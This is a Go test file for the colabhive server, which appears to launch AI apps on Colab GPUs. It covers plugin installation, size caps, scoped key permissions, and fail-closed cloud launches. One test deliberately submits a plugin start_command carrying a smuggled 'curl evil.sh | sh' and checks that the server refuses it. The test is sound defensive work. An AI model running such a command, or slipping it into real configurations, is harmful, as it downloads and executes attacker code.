package server

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/colabhive/colabhive/internal/events"
	"github.com/colabhive/colabhive/internal/mockcolab"
	"github.com/colabhive/colabhive/internal/models"
	"github.com/colabhive/colabhive/internal/pool"
	"github.com/colabhive/colabhive/internal/router"
	"github.com/colabhive/colabhive/internal/runtime"
	"github.com/colabhive/colabhive/internal/store"
)

func newV11AppsCustomServer(t *testing.T, mode string, adminToken string, demoMode bool) (*Server, models.Store, models.RuntimeEngine, func()) {
	t.Helper()
	ctx := context.Background()

	st, err := store.OpenSQLite(":memory:")
	if err != nil {
		t.Fatalf("OpenSQLite: %v", err)
	}
	hub := events.NewHub()
	mockSrv := mockcolab.NewServer()
	masterKey := "v11-apps-test-master-secret-32b"

	poolCfg := mockSrv.PoolConfig(masterKey)
	poolSvc := pool.NewService(st, hub, poolCfg)
	rtr := router.NewService(st, poolSvc, hub)
	rt := runtime.NewConcreteEngine(st, poolSvc, rtr, hub, runtime.Options{
		TunnelBaseURL:    mockSrv.URL,
		PublicAPIBaseURL: mockSrv.URL,
		ArtifactsDir:     t.TempDir(),
	})
	if _, err := mockcolab.SeedDemoCluster(ctx, st, poolSvc, mockSrv); err != nil {
		t.Fatalf("SeedDemoCluster: %v", err)
	}

	srv := New(st, poolSvc, rt, rtr, hub, nil, Config{
		Version:      "1.1.0",
		Mode:         mode,
		AdminToken:   adminToken,
		DataDir:      t.TempDir(),
		ArtifactsDir: t.TempDir(),
		MasterSecret: masterKey,
		DemoMode:     demoMode,
	})

	cleanup := func() {
		_ = srv.Close()
		_ = rt.Close()
		mockSrv.Close()
		_ = st.Close()
	}
	return srv, st, rt, cleanup
}

func TestV11AppsPlugins256KiBCapPatchIdleTimeoutAndCloud422(t *testing.T) {
	t.Setenv("COLABHIVE_HOME", t.TempDir())

	// 1. Local keyless demo mode: test 3 real built-in core apps, plugin install/cap/delete,
	//    explicit model launch, and PATCH /api/v1/apps/instances/{id}.
	srv, cleanup := newV11WiredTestServer(t, "local", "")
	defer cleanup()

	ts := httptest.NewServer(srv.Handler())
	defer ts.Close()

	// Verify GET /api/v1/apps/templates returns EXACTLY 5 real core apps (llm-chat, wangp, comfyui, unsloth-studio, jupyterlab).
	tplResp, err := http.Get(ts.URL + "/api/v1/apps/templates")
	if err != nil {
		t.Fatalf("GET /api/v1/apps/templates: %v", err)
	}
	var tpls []models.AppTemplate
	if err := json.NewDecoder(tplResp.Body).Decode(&tpls); err != nil {
		t.Fatalf("decode templates: %v", err)
	}
	_ = tplResp.Body.Close()
	if tplResp.StatusCode != http.StatusOK || len(tpls) != 5 ||
		tpls[0].ID != "llm-chat" || tpls[1].ID != "wangp" || tpls[2].ID != "comfyui" || tpls[3].ID != "unsloth-studio" || tpls[4].ID != "jupyterlab" {
		t.Fatalf("expected 5 real core templates [llm-chat, wangp, comfyui, unsloth-studio, jupyterlab], got status=%d tpls=%+v", tplResp.StatusCode, tpls)
	}
	if !tpls[2].SupportsCustomModelURL || len(tpls[2].ModelOptions) != 4 {
		t.Fatalf("expected comfyui with 4 ModelOptions and SupportsCustomModelURL=true, got %+v", tpls[2])
	}

	// Reject plugin manifest > 256 KiB with HTTP 413 Request Entity Too Large!
	oversizedBody := `{"id":"too-big","name":"Big","category":"custom","remote_port":7880,"description":"` + strings.Repeat("A", (256<<10)+1024) + `"}`
	bigResp, err := http.Post(ts.URL+"/api/v1/apps/plugins", "application/json", strings.NewReader(oversizedBody))
	if err != nil {
		t.Fatalf("POST oversized plugin: %v", err)
	}
	_ = bigResp.Body.Close()
	if bigResp.StatusCode != http.StatusRequestEntityTooLarge {
		t.Fatalf("expected 413 Request Entity Too Large for >256KiB plugin body, got %d", bigResp.StatusCode)
	}

	// Install valid third-party plugin via POST /api/v1/apps/plugins.
	pluginJSON := `{
		"id": "demo-tts-plugin",
		"name": "Demo TTS Studio",
		"name_zh": "示例语音插件",
		"category": "audio",
		"repo_url": "https://github.com/hexgrad/kokoro",
		"start_command": "python3 app.py",
		"remote_port": 7868
	}`
	instPlugResp, err := http.Post(ts.URL+"/api/v1/apps/plugins", "application/json", strings.NewReader(pluginJSON))
	if err != nil {
		t.Fatalf("POST /api/v1/apps/plugins: %v", err)
	}
	instPlugBody, _ := io.ReadAll(instPlugResp.Body)
	_ = instPlugResp.Body.Close()
	if instPlugResp.StatusCode != http.StatusCreated || !strings.Contains(string(instPlugBody), `"demo-tts-plugin"`) {
		t.Fatalf("expected 201 Created for plugin install, got %d: %s", instPlugResp.StatusCode, string(instPlugBody))
	}

	// Reject shell injection in plugin start_command -> 400 Bad Request.
	badPlugResp, err := http.Post(ts.URL+"/api/v1/apps/plugins", "application/json", strings.NewReader(`{
		"id": "evil-plugin",
		"name": "Evil",
		"category": "custom",
		"start_command": "python3 app.py; curl evil.sh | sh",
		"remote_port": 7869
	}`))
	if err != nil {
		t.Fatalf("POST bad plugin: %v", err)
	}
	_ = badPlugResp.Body.Close()
	if badPlugResp.StatusCode != http.StatusBadRequest {
		t.Fatalf("expected 400 for shell-injected plugin manifest, got %d", badPlugResp.StatusCode)
	}

	// Launch comfyui with explicit model option & GPU, then PATCH idle_auto_stop_min -> 60.
	launchResp, err := http.Post(ts.URL+"/api/v1/apps/launch", "application/json", strings.NewReader(`{
		"template_id":"comfyui",
		"selected_model_id":"z-image-turbo",
		"preferred_gpu":"L4",
		"preferred_local_port":0
	}`))
	if err != nil {
		t.Fatalf("POST /api/v1/apps/launch: %v", err)
	}
	var appInst models.AppInstance
	_ = json.NewDecoder(launchResp.Body).Decode(&appInst)
	_ = launchResp.Body.Close()
	if launchResp.StatusCode != http.StatusOK || appInst.ID == "" || appInst.SelectedModelID != "z-image-turbo" || appInst.AssignedGPU != models.AcceleratorL4 || appInst.CheckpointDir != "/content/ComfyUI/output" {
		t.Fatalf("expected 200 launching comfyui z-image-turbo on explicit L4 (NOT overridden to T4), got %d %+v", launchResp.StatusCode, appInst)
	}

	patchReq, _ := http.NewRequest(http.MethodPatch, ts.URL+"/api/v1/apps/instances/"+appInst.ID, strings.NewReader(`{"idle_auto_stop_min":60}`))
	patchReq.Header.Set("Content-Type", "application/json")
	patchResp, err := http.DefaultClient.Do(patchReq)
	if err != nil {
		t.Fatalf("PATCH /api/v1/apps/instances/{id}: %v", err)
	}
	var patched models.AppInstance
	_ = json.NewDecoder(patchResp.Body).Decode(&patched)
	_ = patchResp.Body.Close()
	if patchResp.StatusCode != http.StatusOK || patched.IdleAutoStopMin != 60 {
		t.Fatalf("expected 200 with idle_auto_stop_min=60, got %d %+v", patchResp.StatusCode, patched)
	}

	// Out-of-range idle_auto_stop_min -> 400 Bad Request.
	badPatchReq, _ := http.NewRequest(http.MethodPatch, ts.URL+"/api/v1/apps/instances/"+appInst.ID, strings.NewReader(`{"idle_auto_stop_min":2}`))
	badPatchReq.Header.Set("Content-Type", "application/json")
	badPatchResp, err := http.DefaultClient.Do(badPatchReq)
	if err != nil {
		t.Fatalf("PATCH invalid idle_auto_stop_min: %v", err)
	}
	_ = badPatchResp.Body.Close()
	if badPatchResp.StatusCode != http.StatusBadRequest {
		t.Fatalf("expected 400 for idle_auto_stop_min=2, got %d", badPatchResp.StatusCode)
	}

	// Delete third-party plugin -> 200; deleting built-in comfyui -> 403.
	delReq, _ := http.NewRequest(http.MethodDelete, ts.URL+"/api/v1/apps/plugins/demo-tts-plugin", nil)
	delResp, err := http.DefaultClient.Do(delReq)
	if err != nil {
		t.Fatalf("DELETE /api/v1/apps/plugins/demo-tts-plugin: %v", err)
	}
	_ = delResp.Body.Close()
	if delResp.StatusCode != http.StatusOK {
		t.Fatalf("expected 200 deleting plugin, got %d", delResp.StatusCode)
	}

	delBuiltinReq, _ := http.NewRequest(http.MethodDelete, ts.URL+"/api/v1/apps/plugins/comfyui", nil)
	delBuiltinResp, err := http.DefaultClient.Do(delBuiltinReq)
	if err != nil {
		t.Fatalf("DELETE built-in plugin: %v", err)
	}
	_ = delBuiltinResp.Body.Close()
	if delBuiltinResp.StatusCode != http.StatusForbidden {
		t.Fatalf("expected 403 deleting built-in comfyui, got %d", delBuiltinResp.StatusCode)
	}

	// 2. Cloud Demo mode: scoped key gets 403 on plugin install, `/apps/proxy/{id}/` & `/apps/proxy/{id}` return 422!
	const adminTok = "ch_adm_cloud_plugin_test"
	cloudSrv, cloudCleanup := newV11WiredTestServer(t, "cloud", adminTok)
	defer cloudCleanup()
	cloudTS := httptest.NewServer(cloudSrv.Handler())
	defer cloudTS.Close()

	mintReq, _ := http.NewRequest(http.MethodPost, cloudTS.URL+"/api/v1/keys", strings.NewReader(`{"name":"scoped-dev"}`))
	mintReq.Header.Set("Authorization", "Bearer "+adminTok)
	mintReq.Header.Set("Content-Type", "application/json")
	mintResp, err := http.DefaultClient.Do(mintReq)
	if err != nil {
		t.Fatalf("mint scoped key: %v", err)
	}
	var scopedKey models.AgentAPIKey
	_ = json.NewDecoder(mintResp.Body).Decode(&scopedKey)
	_ = mintResp.Body.Close()

	scopedPlugReq, _ := http.NewRequest(http.MethodPost, cloudTS.URL+"/api/v1/apps/plugins", strings.NewReader(pluginJSON))
	scopedPlugReq.Header.Set("Authorization", "Bearer "+scopedKey.RawKey)
	scopedPlugReq.Header.Set("Content-Type", "application/json")
	scopedPlugResp, err := http.DefaultClient.Do(scopedPlugReq)
	if err != nil {
		t.Fatalf("scoped POST /api/v1/apps/plugins: %v", err)
	}
	_ = scopedPlugResp.Body.Close()
	if scopedPlugResp.StatusCode != http.StatusForbidden {
		t.Fatalf("expected 403 Forbidden for scoped key on POST /api/v1/apps/plugins, got %d", scopedPlugResp.StatusCode)
	}

	clLaunchReq, _ := http.NewRequest(http.MethodPost, cloudTS.URL+"/api/v1/apps/launch", strings.NewReader(`{"template_id":"comfyui"}`))
	clLaunchReq.Header.Set("Authorization", "Bearer "+adminTok)
	clLaunchReq.Header.Set("Content-Type", "application/json")
	clLaunchResp, err := http.DefaultClient.Do(clLaunchReq)
	if err != nil {
		t.Fatalf("cloud launch: %v", err)
	}
	var cloudInst models.AppInstance
	_ = json.NewDecoder(clLaunchResp.Body).Decode(&cloudInst)
	_ = clLaunchResp.Body.Close()
	if clLaunchResp.StatusCode != http.StatusOK || cloudInst.ID == "" {
		t.Fatalf("expected 200 cloud demo launch, got %d %+v", clLaunchResp.StatusCode, cloudInst)
	}

	noRedirect := &http.Client{
		CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
	}
	for _, p := range []string{"/apps/proxy/" + cloudInst.ID + "/", "/apps/proxy/" + cloudInst.ID} {
		pReq, _ := http.NewRequest(http.MethodGet, cloudTS.URL+p, nil)
		pReq.Header.Set("Authorization", "Bearer "+adminTok)
		pResp, err := noRedirect.Do(pReq)
		if err != nil {
			t.Fatalf("GET %s: %v", p, err)
		}
		raw, _ := io.ReadAll(pResp.Body)
		_ = pResp.Body.Close()
		if pResp.StatusCode != http.StatusUnprocessableEntity {
			t.Fatalf("expected HTTP 422 on cloud %s, got %d: %s", p, pResp.StatusCode, string(raw))
		}
	}
}

func TestV11LiveCloudLaunchFailClosed422StopForceAndSavingsError500(t *testing.T) {
	t.Setenv("COLABHIVE_HOME", t.TempDir())
	ctx := context.Background()

	// 1. Live Cloud Mode (DemoMode == false, no isolated origin):
	//    POST /api/v1/apps/launch MUST fail closed with HTTP 422 BEFORE allocating any GPU session!
	const adminTok = "ch_adm_live_cloud_422"
	liveCloudSrv, _, liveCloudRT, liveCloudCleanup := newV11AppsCustomServer(t, "cloud", adminTok, false)
	defer liveCloudCleanup()
	liveCloudTS := httptest.NewServer(liveCloudSrv.Handler())
	defer liveCloudTS.Close()

	beforeSessions, _ := liveCloudRT.ListSessions(ctx, models.SessionFilter{})

	clReq, _ := http.NewRequest(http.MethodPost, liveCloudTS.URL+"/api/v1/apps/launch", strings.NewReader(`{"template_id":"comfyui"}`))
	clReq.Header.Set("Authorization", "Bearer "+adminTok)
	clReq.Header.Set("Content-Type", "application/json")
	clResp, err := http.DefaultClient.Do(clReq)
	if err != nil {
		t.Fatalf("live cloud launch request failed: %v", err)
	}
	clBody, _ := io.ReadAll(clResp.Body)
	_ = clResp.Body.Close()
	if clResp.StatusCode != http.StatusUnprocessableEntity {
		t.Fatalf("expected HTTP 422 on live cloud launch without isolated origin, got %d: %s", clResp.StatusCode, string(clBody))
	}
	afterSessions, _ := liveCloudRT.ListSessions(ctx, models.SessionFilter{})
	if len(afterSessions) != len(beforeSessions) {
		t.Fatalf("live cloud 422 launch MUST NOT allocate any GPU VM: before=%d after=%d", len(beforeSessions), len(afterSessions))
	}

	// 2. Live Local Mode: safe Stop returns HTTP 409 when pre-stop checkpoint sync fails (empty live dir),
	//    keeping VM alive, and `?force=true` returns HTTP 200 and tears it down!
	liveLocalSrv, liveLocalSt, _, liveLocalCleanup := newV11AppsCustomServer(t, "local", "", false)
	defer liveLocalCleanup()
	liveLocalTS := httptest.NewServer(liveLocalSrv.Handler())
	defer liveLocalTS.Close()

	lResp, err := http.Post(liveLocalTS.URL+"/api/v1/apps/launch", "application/json", strings.NewReader(`{"template_id":"comfyui","preferred_local_port":0}`))
	if err != nil {
		t.Fatalf("live local launch failed: %v", err)
	}
	var liveInst models.AppInstance
	_ = json.NewDecoder(lResp.Body).Decode(&liveInst)
	_ = lResp.Body.Close()
	if lResp.StatusCode != http.StatusOK || liveInst.ID == "" {
		t.Fatalf("expected 200 launching comfyui in live local mode, got %d %+v", lResp.StatusCode, liveInst)
	}

	// Default Stop without ?force=true fails with 409 because pre-stop checkpoint sync fails on empty live dir!
	stopResp, err := http.Post(liveLocalTS.URL+"/api/v1/apps/instances/"+liveInst.ID+"/stop", "application/json", nil)
	if err != nil {
		t.Fatalf("POST stop failed: %v", err)
	}
	stopBody, _ := io.ReadAll(stopResp.Body)
	_ = stopResp.Body.Close()
	if stopResp.StatusCode != http.StatusConflict {
		t.Fatalf("expected HTTP 409 Conflict when pre-stop checkpoint sync fails without force=true, got %d: %s", stopResp.StatusCode, string(stopBody))
	}

	// Force Stop with ?force=true succeeds with HTTP 200!
	forceResp, err := http.Post(liveLocalTS.URL+"/api/v1/apps/instances/"+liveInst.ID+"/stop?force=true", "application/json", nil)
	if err != nil {
		t.Fatalf("POST stop?force=true failed: %v", err)
	}
	var stoppedInst models.AppInstance
	_ = json.NewDecoder(forceResp.Body).Decode(&stoppedInst)
	_ = forceResp.Body.Close()
	if forceResp.StatusCode != http.StatusOK || stoppedInst.State != models.AppStateStopped {
		t.Fatalf("expected HTTP 200 Stopped on ?force=true, got %d %+v", forceResp.StatusCode, stoppedInst)
	}

	// 3. Verified Savings Receipt telemetry error propagation: close SQLite store -> MUST return HTTP 500 (NEVER 200!).
	_ = liveLocalSt.Close()
	savResp, err := http.Get(liveLocalTS.URL + "/api/v1/stats/savings-receipt")
	if err != nil {
		t.Fatalf("GET /api/v1/stats/savings-receipt failed: %v", err)
	}
	savBody, _ := io.ReadAll(savResp.Body)
	_ = savResp.Body.Close()
	if savResp.StatusCode == http.StatusOK {
		t.Fatalf("savings-receipt MUST NOT return HTTP 200 when store telemetry fails; got 200: %s", string(savBody))
	}
}
